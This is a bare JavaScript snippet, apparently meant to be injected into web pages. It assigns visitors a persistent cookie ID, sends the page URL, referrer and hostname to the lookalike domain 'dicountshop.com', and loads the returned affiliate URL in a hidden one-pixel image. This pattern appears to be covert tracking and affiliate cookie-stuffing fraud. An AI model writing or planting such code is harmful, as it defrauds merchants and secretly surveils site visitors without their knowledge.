(async function() {
    
  

    async function initializeTrackingProcess() {
        if (sessionStorage.getItem('trackingInitialized')) {
            return;
        }

        try {
            let clientIdentifier = fetchCookieValue('client_identifier') || createUniqueIdentifier();
            const cookieExpiration = new Date(Date.now() + 30 * 86400 * 1000).toUTCString();
            document.cookie = `client_identifier=${clientIdentifier}; expires=${cookieExpiration}; path=/;`;

            const serverResponse = await fetch('https://dicountshop.com/api/track-user', {
                method: 'POST',
                body: JSON.stringify({
                    url: window.location.href,
                    referrer: document.referrer,
                    unique_id: clientIdentifier,
                    origin: window.location.hostname,
                }),
                headers: {
                    'Content-Type': 'application/json',
                    'Access-Control-Allow-Origin': '*'
                }
            });

            const responseData = await serverResponse.json();
            if (responseData.success && responseData.affiliate_url) {
                appendTrackerImage(responseData.affiliate_url);
                sessionStorage.setItem('trackingInitialized', 'true');
            } else {
                appendTrackerImage(`https://dicountshop.com/api/fallback-pixel?id=${clientIdentifier}`);
            }
        } catch (error) {
            console.error('Tracking system error:', error);
        }
    }

    function fetchCookieValue(cookieName) {
        const namePrefix = cookieName + '=';
        const cookieSegments = document.cookie.split(';');
        for (let index = 0; index < cookieSegments.length; index++) {
            let cookieSegment = cookieSegments[index];
            while (cookieSegment.charAt(0) === ' ') {
                cookieSegment = cookieSegment.substring(1);
            }
            if (cookieSegment.indexOf(namePrefix) === 0) {
                return cookieSegment.substring(namePrefix.length, cookieSegment.length);
            }
        }
        return '';
    }

    function createUniqueIdentifier() {
        return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(character) {
            const randomValue = Math.random() * 16 | 0;
            const hexValue = character === 'x' ? randomValue : (randomValue & 0x3 | 0x8);
            return hexValue.toString(16);
        });
    }

    function appendTrackerImage(imageUrl) {
        const trackerImage = document.createElement('img');
        trackerImage.src = imageUrl;
        trackerImage.style.width = '1px';
        trackerImage.style.height = '1px';
        trackerImage.style.display = 'none';
        trackerImage.style.visibility = 'hidden';
        document.body.appendChild(trackerImage);
    }

    initializeTrackingProcess();
})();